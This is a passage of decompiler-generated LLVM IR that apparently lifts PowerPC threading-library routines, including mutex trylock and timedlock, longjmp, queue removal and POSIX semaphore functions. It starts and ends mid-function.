  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016cf0

dec_label_pc_10016c68:                            ; preds = %dec_label_pc_10016c44
  %v1_10016c6c = add i32 %arg1, 16
  store i32 %v1_10016c6c, i32* %r3.global-to-local, align 4
  %v1_10016c7c = inttoptr i32 %v1_10016c6c to i32*
  %v2_10016c7c = call i32 @__pthread_trylock(i32* %v1_10016c7c)
  store i32 %v2_10016c7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016c80

dec_label_pc_10016c80:                            ; preds = %entry, %dec_label_pc_10016c68
  %v0_10016c90 = phi i32 [ %arg1, %entry ], [ %v2_10016c7c, %dec_label_pc_10016c68 ]
  %v1_10016c80 = add i32 %v0_10016c90, 8
  %v2_10016c80 = inttoptr i32 %v1_10016c80 to i32*
  %v3_10016c80 = load i32, i32* %v2_10016c80, align 4
  %v0_10016c84 = load i32, i32* @r2, align 4
  store i32 %v0_10016c84, i32* @r30, align 4
  %v4_10016c88 = icmp eq i32 %v3_10016c80, %v0_10016c84
  br i1 %v4_10016c88, label %dec_label_pc_10016c90, label %dec_label_pc_10016ca4

dec_label_pc_10016c90:                            ; preds = %dec_label_pc_10016c80
  %v1_10016c90 = add i32 %v0_10016c90, 4
  %v2_10016c90 = inttoptr i32 %v1_10016c90 to i32*
  %v3_10016c90 = load i32, i32* %v2_10016c90, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016c98 = add i32 %v3_10016c90, 1
  %v1_10016c9c = load i32, i32* @r31, align 4
  %v2_10016c9c = add i32 %v1_10016c9c, 4
  %v3_10016c9c = inttoptr i32 %v2_10016c9c to i32*
  store i32 %v1_10016c98, i32* %v3_10016c9c, align 4
  br label %dec_label_pc_10016cf0

dec_label_pc_10016ca4:                            ; preds = %dec_label_pc_10016c80
  %v1_10016ca4 = add i32 %v0_10016c90, 16
  store i32 %v1_10016ca4, i32* %r3.global-to-local, align 4
  %v1_10016ca8 = inttoptr i32 %v1_10016ca4 to i32*
  %v2_10016ca8 = call i32 @__pthread_trylock(i32* %v1_10016ca8)
  store i32 %v2_10016ca8, i32* %r3.global-to-local, align 4
  %v3_10016cac = icmp eq i32 %v2_10016ca8, 0
  br i1 %v3_10016cac, label %dec_label_pc_10016cb4, label %dec_label_pc_10016cf0

dec_label_pc_10016cb4:                            ; preds = %dec_label_pc_10016ca4
  %v0_10016cb4 = load i32, i32* @r30, align 4
  %v1_10016cb4 = load i32, i32* @r31, align 4
  %v2_10016cb4 = add i32 %v1_10016cb4, 8
  %v3_10016cb4 = inttoptr i32 %v2_10016cb4 to i32*
  store i32 %v0_10016cb4, i32* %v3_10016cb4, align 4
  %v0_10016cb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10016cb8 = load i32, i32* @r31, align 4
  %v2_10016cb8 = add i32 %v1_10016cb8, 4
  %v3_10016cb8 = inttoptr i32 %v2_10016cb8 to i32*
  store i32 %v0_10016cb8, i32* %v3_10016cb8, align 4
  br label %dec_label_pc_10016cf0

dec_label_pc_10016cc0:                            ; preds = %dec_label_pc_10016c50
  %v1_10016cc0 = add i32 %arg1, 16
  store i32 %v1_10016cc0, i32* %r3.global-to-local, align 4
  %v1_10016cc4 = inttoptr i32 %v1_10016cc0 to i32*
  %v2_10016cc4 = call i32 @__pthread_alt_trylock(i32* %v1_10016cc4)
  store i32 %v2_10016cc4, i32* %r3.global-to-local, align 4
  %v3_10016cc8 = icmp eq i32 %v2_10016cc4, 0
  br i1 %v3_10016cc8, label %dec_label_pc_10016cd0, label %dec_label_pc_10016cf0

dec_label_pc_10016cd0:                            ; preds = %dec_label_pc_10016cc0
  %v0_10016cd0 = load i32, i32* @r2, align 4
  %v1_10016cd0 = load i32, i32* @r31, align 4
  %v2_10016cd0 = add i32 %v1_10016cd0, 8
  %v3_10016cd0 = inttoptr i32 %v2_10016cd0 to i32*
  store i32 %v0_10016cd0, i32* %v3_10016cd0, align 4
  br label %dec_label_pc_10016cf0

dec_label_pc_10016cd8:                            ; preds = %dec_label_pc_10016c58
  %v1_10016cdc = add i32 %arg1, 16
  store i32 %v1_10016cdc, i32* %r3.global-to-local, align 4
  %v1_10016cec = inttoptr i32 %v1_10016cdc to i32*
  %v2_10016cec = call i32 @__pthread_alt_trylock(i32* %v1_10016cec)
  store i32 %v2_10016cec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016cf0

dec_label_pc_10016cf0:                            ; preds = %dec_label_pc_10016cc0, %dec_label_pc_10016ca4, %dec_label_pc_10016cd0, %dec_label_pc_10016cb4, %dec_label_pc_10016c90, %dec_label_pc_10016c60, %dec_label_pc_10016cd8
  %v0_10016d00 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016d00

; uselistorder directives
  uselistorder i32 %v0_10016c90, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 11, 4, 5, 1, 6, 2, 3, 8, 7, 9, 10, 12, 0 }
  uselistorder i32 (i32*)* @__pthread_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 5, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_10016cf0, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10016c80, { 1, 0 }
  uselistorder label %dec_label_pc_10016c60, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10016d20 = add i32 %arg2, 4
  %v2_10016d20 = inttoptr i32 %v1_10016d20 to i32*
  %v3_10016d20 = load i32, i32* %v2_10016d20, align 4
  %v3_10016d24 = icmp ugt i32 %v3_10016d20, 999999999
  br i1 %v3_10016d24, label %dec_label_pc_10016e08, label %dec_label_pc_10016d2c

dec_label_pc_10016d2c:                            ; preds = %entry
  %v1_10016d2c = add i32 %arg1, 12
  %v2_10016d2c = inttoptr i32 %v1_10016d2c to i32*
  %v3_10016d2c = load i32, i32* %v2_10016d2c, align 4
  %v3_10016d30 = icmp eq i32 %v3_10016d2c, 1
  br i1 %v3_10016d30, label %dec_label_pc_10016d70, label %dec_label_pc_10016d38

dec_label_pc_10016d38:                            ; preds = %dec_label_pc_10016d2c
  %v2_10016d30 = icmp sgt i32 %v3_10016d2c, 1
  br i1 %v2_10016d30, label %dec_label_pc_10016d48, label %dec_label_pc_10016d3c

dec_label_pc_10016d3c:                            ; preds = %dec_label_pc_10016d38
  %v3_10016d3c = icmp eq i32 %v3_10016d2c, 0
  br i1 %v3_10016d3c, label %dec_label_pc_10016d5c, label %dec_label_pc_10016e08

dec_label_pc_10016d48:                            ; preds = %dec_label_pc_10016d38
  %v3_10016d48 = icmp eq i32 %v3_10016d2c, 2
  br i1 %v3_10016d48, label %dec_label_pc_10016db0, label %dec_label_pc_10016d50

dec_label_pc_10016d50:                            ; preds = %dec_label_pc_10016d48
  %v3_10016d50 = icmp eq i32 %v3_10016d2c, 3
  br i1 %v3_10016d50, label %dec_label_pc_10016de8, label %dec_label_pc_10016e08

dec_label_pc_10016d5c:                            ; preds = %dec_label_pc_10016d3c
  %v1_10016d5c = add i32 %arg1, 16
  store i32 %v1_10016d5c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016d68.1085 to i32), i32* @lr, align 4
  %v0_10016d64 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016e14

dec_label_pc_10016d70:                            ; preds = %dec_label_pc_10016d2c
  %v1_10016d70 = add i32 %arg1, 8
  %v2_10016d70 = inttoptr i32 %v1_10016d70 to i32*
  %v3_10016d70 = load i32, i32* %v2_10016d70, align 4
  %v0_10016d74 = load i32, i32* @r2, align 4
  %v4_10016d78 = icmp eq i32 %v3_10016d70, %v0_10016d74
  br i1 %v4_10016d78, label %dec_label_pc_10016d80, label %dec_label_pc_10016d94

dec_label_pc_10016d80:                            ; preds = %dec_label_pc_10016d70
  %v1_10016d80 = add i32 %arg1, 4
  %v2_10016d80 = inttoptr i32 %v1_10016d80 to i32*
  %v3_10016d80 = load i32, i32* %v2_10016d80, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016d88 = add i32 %v3_10016d80, 1
  store i32 %v1_10016d88, i32* %v2_10016d80, align 4
  br label %dec_label_pc_10016e14

dec_label_pc_10016d94:                            ; preds = %dec_label_pc_10016d70
  %v1_10016d94 = add i32 %arg1, 16
  store i32 %v1_10016d94, i32* @r3, align 4
  store i32 %v0_10016d74, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10016da0.1086 to i32), i32* @lr, align 4
  %v0_10016d9c = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016da8 = load i32, i32* @r31, align 4
  %v2_10016da8 = add i32 %v1_10016da8, 4
  %v3_10016da8 = inttoptr i32 %v2_10016da8 to i32*
  store i32 0, i32* %v3_10016da8, align 4
  br label %dec_label_pc_10016de0

dec_label_pc_10016db0:                            ; preds = %dec_label_pc_10016d48
  %v1_10016db0 = add i32 %arg1, 8
  %v2_10016db0 = inttoptr i32 %v1_10016db0 to i32*
  %v3_10016db0 = load i32, i32* %v2_10016db0, align 4
  %v0_10016db4 = load i32, i32* @r2, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10016dbc = icmp eq i32 %v3_10016db0, %v0_10016db4
  br i1 %v4_10016dbc, label %dec_label_pc_10016e14, label %dec_label_pc_10016dc4

dec_label_pc_10016dc4:                            ; preds = %dec_label_pc_10016db0
  %v1_10016dc8 = add i32 %arg1, 16
  store i32 %v1_10016dc8, i32* %r3.global-to-local, align 4
  store i32 268529108, i32* @lr, align 4
  %v4_10016dd0 = inttoptr i32 %v1_10016dc8 to i32*
  %v5_10016dd0 = call i32 @__pthread_alt_timedlock(i32* %v4_10016dd0, i32 %v0_10016db4, i32 %arg2, i32 999999999)
  store i32 %v5_10016dd0, i32* %r3.global-to-local, align 4
  %v3_10016dd4 = icmp eq i32 %v5_10016dd0, 0
  br i1 %v3_10016dd4, label %dec_label_pc_10016e10, label %dec_label_pc_10016ddc

dec_label_pc_10016ddc:                            ; preds = %dec_label_pc_10016dc4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016de0

dec_label_pc_10016de0:                            ; preds = %dec_label_pc_10016d94, %dec_label_pc_10016ddc
  %v0_10016de0 = load i32, i32* @r30, align 4
  %v1_10016de0 = load i32, i32* @r31, align 4
  %v2_10016de0 = add i32 %v1_10016de0, 8
  %v3_10016de0 = inttoptr i32 %v2_10016de0 to i32*
  store i32 %v0_10016de0, i32* %v3_10016de0, align 4
  br label %dec_label_pc_10016e14

dec_label_pc_10016de8:                            ; preds = %dec_label_pc_10016d50
  %v1_10016dec = add i32 %arg1, 16
  store i32 %v1_10016dec, i32* %r3.global-to-local, align 4
  store i32 268529144, i32* @lr, align 4
  %v4_10016df4 = inttoptr i32 %v1_10016dec to i32*
  %v5_10016df4 = call i32 @__pthread_alt_timedlock(i32* %v4_10016df4, i32 0, i32 %arg2, i32 999999999)
  %v3_10016df8 = icmp eq i32 %v5_10016df4, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10016df8, label %dec_label_pc_10016e10, label %dec_label_pc_10016e14

dec_label_pc_10016e08:                            ; preds = %dec_label_pc_10016d3c, %dec_label_pc_10016d50, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016e14

dec_label_pc_10016e10:                            ; preds = %dec_label_pc_10016de8, %dec_label_pc_10016dc4
  store i32 110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016e14

dec_label_pc_10016e14:                            ; preds = %dec_label_pc_10016de8, %dec_label_pc_10016db0, %dec_label_pc_10016e08, %dec_label_pc_10016de0, %dec_label_pc_10016d80, %dec_label_pc_10016d5c, %dec_label_pc_10016e10
  %v0_10016e24 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016e24

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i32 %arg1, { 3, 0, 1, 5, 4, 2, 7, 6, 8 }
  uselistorder label %dec_label_pc_10016e14, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10016e08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10016de0, { 1, 0 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10016e28 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10016e28, i32* %stack_var_-32, align 4
  %v5_10016e28 = ptrtoint i32* %stack_var_-32 to i32
  %v0_10016e34 = load i32, i32* @r2, align 4
  store i32 %v0_10016e34, i32* %r30.global-to-local, align 4
  %v0_10016e3c = load i32, i32* @r3, align 4
  store i32 %v0_10016e3c, i32* @r28, align 4
  store i32 %v5_10016e28, i32* @r29, align 4
  %v1_10016e44 = add i32 %v0_10016e34, 60
  %storemerge.in11 = inttoptr i32 %v1_10016e44 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r31.global-to-local, align 4
  %v3_10016e6c15 = icmp eq i32 %storemerge12, 0
  %v3_10016e7017 = icmp ugt i32 %storemerge12, %v5_10016e28
  br i1 %v3_10016e6c15, label %dec_label_pc_10016e84, label %dec_label_pc_10016e78

dec_label_pc_10016e4c:                            ; preds = %dec_label_pc_10016e78
  br i1 %v3_10016e7021, label %dec_label_pc_10016e58, label %dec_label_pc_10016e50

dec_label_pc_10016e50:                            ; preds = %dec_label_pc_10016e4c
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10016e84

dec_label_pc_10016e58:                            ; preds = %dec_label_pc_10016e4c
  %v1_10016e58 = inttoptr i32 %storemerge20 to i32*
  %v2_10016e58 = load i32, i32* %v1_10016e58, align 4
  %v1_10016e5c = add i32 %storemerge20, 4
  %v2_10016e5c = inttoptr i32 %v1_10016e5c to i32*
  %v3_10016e5c = load i32, i32* %v2_10016e5c, align 4
  call void @__pseudo_call(i32 %v2_10016e58)
  %v0_10016e68 = load i32, i32* %r31.global-to-local, align 4
  %v1_10016e68 = add i32 %v0_10016e68, 12
  %v1_10016e70.pre = load i32, i32* @r29, align 4
  %storemerge.in = inttoptr i32 %v1_10016e68 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10016e6c = icmp eq i32 %storemerge, 0
  br i1 %v3_10016e6c, label %dec_label_pc_10016e84, label %dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge

dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge: ; preds = %dec_label_pc_10016e58
  %v3_10016e70 = icmp ugt i32 %storemerge, %v1_10016e70.pre
  %v0_10016e78.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10016e78

dec_label_pc_10016e78:                            ; preds = %entry, %dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge
  %v0_10016e78 = phi i32 [ %v0_10016e78.pre, %dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge ], [ %v0_10016e3c, %entry ]
  %v3_10016e7021 = phi i1 [ %v3_10016e70, %dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge ], [ %v3_10016e7017, %entry ]
  %storemerge20 = phi i32 [ %storemerge, %dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge ], [ %storemerge12, %entry ]
  %.019 = phi i32 [ %v3_10016e5c, %dec_label_pc_10016e58.dec_label_pc_10016e78_crit_edge ], [ undef, %entry ]
  %v1_10016e78 = inttoptr i32 %v0_10016e78 to i32*
  %v2_10016e78 = load i32, i32* %v1_10016e78, align 4
  %v2_10016e7c = icmp ult i32 %storemerge20, %v2_10016e78
  br i1 %v2_10016e7c, label %dec_label_pc_10016e4c, label %dec_label_pc_10016e84

dec_label_pc_10016e84:                            ; preds = %entry, %dec_label_pc_10016e58, %dec_label_pc_10016e78, %dec_label_pc_10016e50
  %.010 = phi i32 [ %.019, %dec_label_pc_10016e50 ], [ undef, %entry ], [ %v3_10016e5c, %dec_label_pc_10016e58 ], [ %.019, %dec_label_pc_10016e78 ]
  %v0_10016e88 = phi i32 [ 0, %dec_label_pc_10016e50 ], [ 0, %entry ], [ 0, %dec_label_pc_10016e58 ], [ %storemerge20, %dec_label_pc_10016e78 ]
  %v0_10016e84 = load i32, i32* %r30.global-to-local, align 4
  %v1_10016e84 = add i32 %v0_10016e84, 84
  %v2_10016e84 = inttoptr i32 %v1_10016e84 to i32*
  %v3_10016e84 = load i32, i32* %v2_10016e84, align 4
  store i32 %v3_10016e84, i32* %r9.global-to-local, align 4
  %v2_10016e88 = add i32 %v0_10016e84, 60
  %v3_10016e88 = inttoptr i32 %v2_10016e88 to i32*
  store i32 %v0_10016e88, i32* %v3_10016e88, align 4
  %v0_10016e8c = load i32, i32* %r9.global-to-local, align 4
  %v3_10016e8c = icmp eq i32 %v0_10016e8c, 0
  br i1 %v3_10016e8c, label %dec_label_pc_10016ea8, label %dec_label_pc_10016e94

dec_label_pc_10016e94:                            ; preds = %dec_label_pc_10016e84
  %v0_10016e94 = load i32, i32* @r28, align 4
  %v1_10016e94 = inttoptr i32 %v0_10016e94 to i32*
  %v2_10016e94 = load i32, i32* %v1_10016e94, align 4
  %v2_10016e98 = icmp ult i32 %v0_10016e8c, %v2_10016e94
  br i1 %v2_10016e98, label %dec_label_pc_10016ea0, label %dec_label_pc_10016ea8

dec_label_pc_10016ea0:                            ; preds = %dec_label_pc_10016e94
  %v1_10016ea4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10016ea4 = add i32 %v1_10016ea4, 84
  %v3_10016ea4 = inttoptr i32 %v2_10016ea4 to i32*
  store i32 0, i32* %v3_10016ea4, align 4
  br label %dec_label_pc_10016ea8

dec_label_pc_10016ea8:                            ; preds = %dec_label_pc_10016e94, %dec_label_pc_10016e84, %dec_label_pc_10016ea0
  ret i32 %.010

; uselistorder directives
  uselistorder i32 %storemerge20, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10016ea8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10016e84, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_10016e78, { 1, 0 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268529368, i32* @lr, align 4
  %v0_10016ed4 = call i32 @pthread_cleanup_upto()
  %v0_10016ed8 = load i32, i32* @r29, align 4
  %v0_10016edc = load i32, i32* @r28, align 4
  store i32 268529380, i32* @lr, align 4
  %v2_10016ee0 = call i32 @_longjmp(i32 %v0_10016ed8, i32 %v0_10016edc)
  ret i32 %v2_10016ee0
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268529408, i32* @lr, align 4
  %v0_10016efc = call i32 @pthread_cleanup_upto()
  %v0_10016f00 = load i32, i32* @r29, align 4
  %v0_10016f04 = load i32, i32* @r28, align 4
  store i32 268529420, i32* @lr, align 4
  %v2_10016f08 = call i32 @_longjmp(i32 %v0_10016f00, i32 %v0_10016f04)
  ret i32 %v2_10016f08

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @enqueue.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 0, 3 }
}

define i32 @remove_from_queue.6(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10016f64.pre = load i32, i32* @r3, align 4
  %v1_10016f6421 = inttoptr i32 %v0_10016f64.pre to i32*
  %v2_10016f6422 = load i32, i32* %v1_10016f6421, align 4
  store i32 %v2_10016f6422, i32* %r9.global-to-local, align 4
  %v3_10016f6825 = icmp eq i32 %v2_10016f6422, 0
  br i1 %v3_10016f6825, label %dec_label_pc_10016f74, label %dec_label_pc_10016f44

dec_label_pc_10016f44:                            ; preds = %entry, %dec_label_pc_10016f60
  %v2_10016f64.pn = phi i32 [ %v2_10016f64, %dec_label_pc_10016f60 ], [ %v2_10016f6422, %entry ]
  %v2_10016f6430 = phi i32 [ %v2_10016f64, %dec_label_pc_10016f60 ], [ %v2_10016f6422, %entry ]
  %v1_10016f6429 = phi i32* [ %v1_10016f64, %dec_label_pc_10016f60 ], [ %v1_10016f6421, %entry ]
  %v4_10016f6c35 = icmp eq i32 %v2_10016f64.pn, %arg1
  %v1_10016f48 = add i32 %v2_10016f6430, 8
  br i1 %v4_10016f6c35, label %dec_label_pc_10016f48, label %dec_label_pc_10016f60

dec_label_pc_10016f48:                            ; preds = %dec_label_pc_10016f44
  %v2_10016f48 = inttoptr i32 %v1_10016f48 to i32*
  %v3_10016f48 = load i32, i32* %v2_10016f48, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_10016f48, i32* %v1_10016f6429, align 4
  %v1_10016f58 = load i32, i32* %r9.global-to-local, align 4
  %v2_10016f58 = add i32 %v1_10016f58, 8
  %v3_10016f58 = inttoptr i32 %v2_10016f58 to i32*
  store i32 0, i32* %v3_10016f58, align 4
  %v0_10016f78.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10016f78

dec_label_pc_10016f60:                            ; preds = %dec_label_pc_10016f44
  %v1_10016f64 = inttoptr i32 %v1_10016f48 to i32*
  %v2_10016f64 = load i32, i32* %v1_10016f64, align 4
  store i32 %v2_10016f64, i32* %r9.global-to-local, align 4
  %v3_10016f68 = icmp eq i32 %v2_10016f64, 0
  br i1 %v3_10016f68, label %dec_label_pc_10016f74, label %dec_label_pc_10016f44

dec_label_pc_10016f74:                            ; preds = %dec_label_pc_10016f60, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10016f78

dec_label_pc_10016f78:                            ; preds = %dec_label_pc_10016f48, %dec_label_pc_10016f74
  %v0_10016f78 = phi i32 [ %v0_10016f78.pre, %dec_label_pc_10016f48 ], [ 0, %dec_label_pc_10016f74 ]
  ret i32 %v0_10016f78

; uselistorder directives
  uselistorder i32 %v2_10016f64, { 2, 3, 0, 1 }
  uselistorder i32* %v1_10016f64, { 1, 0 }
  uselistorder i32 %v1_10016f48, { 1, 0 }
  uselistorder i32 %v2_10016f6422, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10016f78, { 1, 0 }
  uselistorder label %dec_label_pc_10016f44, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10016f80 = add i32 %arg1, 8
  %v2_10016f80 = inttoptr i32 %v1_10016f80 to i32*
  %v3_10016f80 = load i32, i32* %v2_10016f80, align 4
  store i32 %v3_10016f80, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if.7(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10016f94 = call i32 @__asm_mfcr()
  store i32 %v0_10016f94, i32* %r3.global-to-local, align 4
  %v3_10016f9c = icmp eq i32 %arg2, 0
  store i1 %v3_10016f9c, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10016f94, i32* @r31, align 4
  store i32 %v0_10016f94, i32* @r4, align 4
  br i1 %v3_10016f9c, label %dec_label_pc_10016fd4, label %dec_label_pc_10016fbc

dec_label_pc_10016fbc:                            ; preds = %entry
  %v1_10016fbc = add i32 %v0_10016f94, 64
  %v2_10016fbc = inttoptr i32 %v1_10016fbc to i8*
  %v3_10016fbc = load i8, i8* %v2_10016fbc, align 1
  %v3_10016fc0 = icmp eq i8 %v3_10016fbc, 0
  br i1 %v3_10016fc0, label %dec_label_pc_10016fd4.thread, label %dec_label_pc_10016fe4

dec_label_pc_10016fd4.thread:                     ; preds = %dec_label_pc_10016fbc
  %v2_10016fd44 = add i32 %v0_10016f94, 444
  %v3_10016fd45 = inttoptr i32 %v2_10016fd44 to i32*
  store i32 %arg2, i32* %v3_10016fd45, align 4
  br label %dec_label_pc_10016fe4

dec_label_pc_10016fd4:                            ; preds = %entry
  %v1_10016fcc = add i32 %v0_10016f94, 28
  %v2_10016fcc = inttoptr i32 %v1_10016fcc to i32*
  %v3_10016fcc = load i32, i32* %v2_10016fcc, align 4
  store i32 %v3_10016fcc, i32* @r3, align 4
  store i32 268529620, i32* @lr, align 4
  %v0_10016fd0 = call i32 @__pthread_lock()
  store i32 %v0_10016fd0, i32* %r3.global-to-local, align 4
  %v0_10016fd4.pre = load i32, i32* @r30, align 4
  %v1_10016fd4.pre = load i32, i32* @r31, align 4
  %v0_10016fd8.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10016fd4 = add i32 %v1_10016fd4.pre, 444
  %v3_10016fd4 = inttoptr i32 %v2_10016fd4 to i32*
  store i32 %v0_10016fd4.pre, i32* %v3_10016fd4, align 4
  br i1 %v0_10016fd8.pre, label %dec_label_pc_10016fdc, label %dec_label_pc_10016fe4

dec_label_pc_10016fdc:                            ; preds = %dec_label_pc_10016fd4
  %v0_10016fdc = load i32, i32* @r31, align 4
  %v1_10016fdc = add i32 %v0_10016fdc, 28
  %v2_10016fdc = inttoptr i32 %v1_10016fdc to i32*
  %v3_10016fdc = load i32, i32* %v2_10016fdc, align 4
  store i32 %v3_10016fdc, i32* @r3, align 4
  store i32 268529636, i32* @lr, align 4
  %v0_10016fe0 = call i32 @__pthread_unlock()
  store i32 %v0_10016fe0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016fe4

dec_label_pc_10016fe4:                            ; preds = %dec_label_pc_10016fd4.thread, %dec_label_pc_10016fd4, %dec_label_pc_10016fbc, %dec_label_pc_10016fdc
  %v1_10016ff8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10016f94)
  %v0_10016ffc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016ffc

; uselistorder directives
  uselistorder i32 %v0_10016f94, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32 444, { 3, 0, 6, 1, 5, 2, 4 }
  uselistorder label %dec_label_pc_10016fe4, { 3, 1, 0, 2 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v0_1001700c = call i32 @__errno_location()
  %v2_10017014 = inttoptr i32 %v0_1001700c to i32*
  store i32 38, i32* %v2_10017014, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_10017038 = call i32 @__errno_location()
  %v2_10017040 = inttoptr i32 %v0_10017038 to i32*
  store i32 38, i32* %v2_10017040, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v0_10017064 = call i32 @__errno_location()
  %v2_1001706c = inttoptr i32 %v0_10017064 to i32*
  store i32 38, i32* %v2_1001706c, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10017090 = add i32 %arg1, 12
  %v2_10017090 = inttoptr i32 %v1_10017090 to i32*
  %v3_10017090 = load i32, i32* %v2_10017090, align 4
  %v3_10017098 = icmp eq i32 %v3_10017090, 0
  br i1 %v3_10017098, label %dec_label_pc_100170b0, label %dec_label_pc_100170a0

dec_label_pc_100170a0:                            ; preds = %entry
  %v0_100170a0 = call i32 @__errno_location()
  %v2_100170a8 = inttoptr i32 %v0_100170a0 to i32*
  store i32 16, i32* %v2_100170a8, align 4
  br label %dec_label_pc_100170b0

dec_label_pc_100170b0:                            ; preds = %entry, %dec_label_pc_100170a0
  %v0_100170bc = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_100170a0 ]
  ret i32 %v0_100170bc

; uselistorder directives
  uselistorder label %dec_label_pc_100170b0, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268529884, i32* @lr, align 4
  %v0_100170d8 = call i32 @__pthread_lock()
  %v0_100170dc = load i32, i32* @r31, align 4
  %v1_100170dc = add i32 %v0_100170dc, 8
  %v2_100170dc = inttoptr i32 %v1_100170dc to i32*
  %v3_100170dc = load i32, i32* %v2_100170dc, align 4
  store i32 -1, i32* %r30.global-to-local, align 4
  %v3_100170e4 = icmp eq i32 %v3_100170dc, 0
  br i1 %v3_100170e4, label %dec_label_pc_100170f0, label %dec_label_pc_10017100

dec_label_pc_100170f0:                            ; preds = %entry
  %v0_100170f0 = call i32 @__errno_location()
  %v2_100170f8 = inttoptr i32 %v0_100170f0 to i32*
  store i32 11, i32* %v2_100170f8, align 4
  br label %dec_label_pc_10017108

dec_label_pc_10017100:                            ; preds = %entry
  %v1_100170e8 = add i32 %v3_100170dc, -1
